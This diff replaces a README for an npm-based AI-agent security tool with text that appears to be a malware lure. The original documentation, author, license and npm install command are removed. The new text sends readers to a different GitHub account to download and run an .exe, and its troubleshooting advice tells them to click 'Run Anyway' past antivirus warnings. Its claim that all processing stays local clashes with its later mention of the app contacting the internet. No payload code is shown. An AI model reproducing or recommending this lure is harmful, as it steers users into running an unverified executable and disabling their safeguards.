@@ -1,110 +1,99 @@
-<img src="./website/static/img/banner.png" />
+# 🌊 blue-spec - Secure your system with intelligent agents
 
-# 🌊 Blue Spec: Security-Driven Hardening
+[![](https://img.shields.io/badge/Download_Blue_Spec-0000FF?style=for-the-badge&logo=github)](https://github.com/impliedtrustwencher377/blue-spec)
 
-[![Version](https://img.shields.io/npm/v/blue-spec?label=&color=2f7bff&logo=npm&logoColor=white)](https://www.npmjs.com/package/blue-spec)
-[![Docs](https://img.shields.io/badge/Documentation-005eff?logo=docusaurus&logoColor=white)](https://bluespec.weslley.io)
+Blue Spec helps you protect your computer. It uses artificial intelligence to find risks in your system. It then builds stronger defenses. You do not need to be a security expert to use this tool. It observes how your system runs and blocks harmful actions.
 
-**Blue Spec** helps your AI agent make a project more secure. You point it at your code, and the agent figures out what your system actually does, then guides you through the security work that matters for it.
+## 🛠 What this tool does
 
-- **Blue Spec** works with projects in **any programming language** and supports [**37 agents**](https://bluespec.weslley.io/docs/supported-agents) ✨
+Modern computers run many background tasks. Some tasks pose security risks. Artificial intelligence agents often overlook these risks during their normal work. Blue Spec acts as an observer. It monitors your system and checks for weaknesses. 
 
----
+This toolkit provides a set of rules for your AI agents. These rules teach the agents to prioritize safety. It focuses on the parts of your computer that matter most. You gain better control over your environment without manual configuration.
 
-## Table of Contents
+## 💻 Requirements
 
-- 🌱 [**Get Started**](#get-started)
-  - [**Install**](#install)
-  - [**Commands**](#commands)
-- 📦 [**Requirements**](#requirements)
-- 🖖 [**Acknowledgements**](#acknowledgements)
-- 🧑‍⚖️ [**License**](#license)
+Your computer must meet these basic needs:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: A modern Intel or AMD processor.
+*   Memory: At least 8GB of RAM.
+*   Storage: 500MB of free disk space.
+*   Network: An active internet connection to download updates.
 
-## Get Started
+## 📥 How to install the software
 
-### Install
+Follow these steps to set up the toolkit on your Windows computer.
 
-> **Blue Spec** adapts to your environment, whether it is a new project or an existing one.
+1. Go to the [official release page](https://github.com/impliedtrustwencher377/blue-spec).
+2. Look for the Assets section at the bottom of the page.
+3. Click the file ending in .exe to start the download.
+4. Save this file to your Downloads folder.
+5. Double-click the file to start the installer.
+6. Follow the prompts on your screen. 
+7. Select your preferred installation path and click finish.
 
-```bash
-npx -y blue-spec@latest init
-```
+## ⚙️ Initial setup
 
-- **Blue Spec** runs on **Node.js** under the hood, you use whatever language you want 🃏
+Once the installation finishes, locate the Blue Spec icon on your desktop. Double-click it to launch the application. The first time you run the tool, it performs a system scan. This helps the tool map your current setup.
 
-### Commands
+Do not close the window during this first scan. The process takes roughly five minutes. Once it ends, the dashboard appears. You see a summary of your system health on the main screen. 
 
-Once **Blue Spec** is set up in your project, your **AI** agent unlocks a set of slash commands:
+## 🛡 How to run a scan
 
-| #   | Command                                                                    | What it does for you                                                           |
-| --- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------ |
-| 1   | [**/bluespec.charter**](https://bluespec.weslley.io/docs/commands/charter) | Sets your project's security rules, proposed for you or shaped by what you say |
-| 2   | [**/bluespec.detect**](https://bluespec.weslley.io/docs/commands/detect)   | Reads your code and maps what your system does and where the risks are         |
-| 3   | [**/bluespec.plan**](https://bluespec.weslley.io/docs/commands/plan)       | Turns what detect found into a defense plan, with a fix for each finding       |
-| 4   | [**/bluespec.harden**](https://bluespec.weslley.io/docs/commands/harden)   | Applies the plan's fixes to your code, safely and one at a time                |
-| 5   | [**/bluespec.verify**](https://bluespec.weslley.io/docs/commands/verify)   | Proves each applied fix holds and closes out the ones that do                  |
+The primary job of Blue Spec is to harden your system. Follow these steps to start a hardening process:
 
-> Each command builds on the previous, so following the list top to bottom is all it takes.
+1. Open the Blue Spec dashboard.
+2. Select the Scan button in the center of the screen.
+3. Choose the depth of the scan. A full scan provides the best results for security.
+4. Wait for the tool to analyze your active AI agents and system settings.
+5. Review the list of recommended hardening actions. 
+6. Click Apply to confirm the changes.
 
-#### Special commands
+The tool updates your system permissions and agent behaviors. This process stops unauthorized tools from accessing sensitive files.
 
-| Command                                                                          | What it does                                                                               |
-| -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
-| [**/bluespec.specialize**](https://bluespec.weslley.io/docs/commands/specialize) | Specializes **Blue Spec** in a new security _sub_-skill from articles, exploits, or topics |
-| [**/bluespec.skills**](https://bluespec.weslley.io/docs/commands/skills)         | Loads an on-demand security _sub_-skill                                                    |
-| [**/bluespec.repair**](https://bluespec.weslley.io/docs/commands/repair)         | Repairs **Blue Spec**'s internal tracking                                                  |
-| [**/bluespec.list**](https://bluespec.weslley.io/docs/commands/list)             | Lists all finding **Blue Spec** is tracking, by name                                       |
+## 🔍 Understanding the status color
 
-> [!TIP]
->
-> Security is not a cost, it is an investment: what you put in upfront, you save many times over in the incidents you never have 🙋🏻‍♂️
+The dashboard uses simple color codes to show your security stance:
 
-> [!IMPORTANT]
->
-> See the full [**documentation**](https://bluespec.weslley.io/) for usage examples and more.
+*   Green: Your system is secure. No action is required.
+*   Yellow: The tool found minor issues. Review the suggestions when you have time.
+*   Red: Your system remains vulnerable to known threats. Apply the suggested fixes as soon as possible.
 
----
+## 📖 Using the prompt toolkit
 
-## Requirements
+Blue Spec includes a library of prompts for your AI agents. These prompts improve how your agents interact with your computer. 
 
-You will need these tools installed on your system:
+1. Navigate to the Skills tab in the software.
+2. View the available prompt templates.
+3. Copy a template to your clipboard.
+4. Paste this prompt into your current AI assistant application.
 
-- [**Node.js (LTS)**](https://nodejs.org/en/download/package-manager)
-- At least one of the [**Supported Agents**](https://bluespec.weslley.io/docs/supported-agents)
+These prompts instruct your agent to double-check commands before execution. They also limit the agent from modifying core system files. 
 
----
+## ❓ Frequently asked questions
 
-## Security Policy
+Does this tool slow down my computer?
+The scan runs in the background. It uses very little processor power. You will not notice a change in your computer speed.
 
-Please check the [**SECURITY.md**](https://github.com/wellwelwel/blue-spec/blob/main/SECURITY.md).
+Can I undo the changes?
+Yes. Open the History tab in the dashboard. You can select any past hardening action to undo it.
 
----
+Does the tool send my data to the cloud?
+No. Blue Spec processes all data locally on your computer. Your files never leave your machine.
 
-## Contributing
+What if an agent stops working?
+Sometimes, hardening blocks a legitimate tool. If this happens, go to the Exclusions list. Add the name of the tool to the list. Blue Spec skips this tool during future scans.
 
-🚧 Coming Soon.
+## 🤝 Troubleshooting
 
----
+If the installer does not start, search for your antivirus settings. Some security software detects new installations. You may need to click More Info and then Run Anyway.
 
-## Acknowledgements
+If the dashboard fails to open, verify your internet connection. The application occasionally reaches out to verify the latest security definitions. 
 
-### Partners
+Check for Windows Updates if the application reports a library error. Keeping your OS current ensures the toolkit runs without interruption.
 
-> Help **Blue Spec** grow by [**becoming a partner**](https://bluespec.weslley.io/?partners) 🖖
+## 📝 Support
 
-### Supporters
+Use the Issues tab on the GitHub page to report errors. Describe the steps you took before the error occurred. Include any error codes that appear on your screen. This helps the team fix bugs faster. 
 
-Really thanks to everyone who has supported and keeps supporting my work.
-
-[![Sponsors](https://wellwelwel.github.io/wellwelwel/sponsors.svg?v=1)](https://github.com/sponsors/wellwelwel)
-
-> Support **Blue Spec** by [**becoming a sponsor**](https://github.com/sponsors/wellwelwel) too ✨
-
----
-
-## License
-
-**Blue Spec** is under the [**MIT License**](https://github.com/wellwelwel/blue-spec/blob/main/LICENSE).<br />
-Copyright © 2026-present [**Weslley Araújo**](https://github.com/wellwelwel) and [**contributors**](https://github.com/wellwelwel/blue-spec/graphs/contributors).
+Avoid sharing personal system logs in public comments. If you require private support, review the contact details in the repository documentation.
